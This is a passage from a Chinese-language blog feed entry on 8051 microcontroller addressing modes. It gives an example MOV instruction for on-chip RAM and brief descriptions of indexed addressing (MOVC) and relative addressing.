&lt;pre class=&quot;example&quot;&gt;
MOV @R0, A
访问片内RAM
&lt;/pre&gt;

&lt;p&gt;
5、变址寻址
&lt;/p&gt;

&lt;p&gt;
变址寻址只能对程序存储器中的数据进行读取访问，在指令符号上采用MOVC的形式。
&lt;/p&gt;

&lt;p&gt;
6、相对寻址
&lt;/p&gt;

&lt;p&gt;
相对寻址是为实现程序的相对转移而设计。
&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;</content><author><name>jsf</name></author><category term="C" /></entry></feed>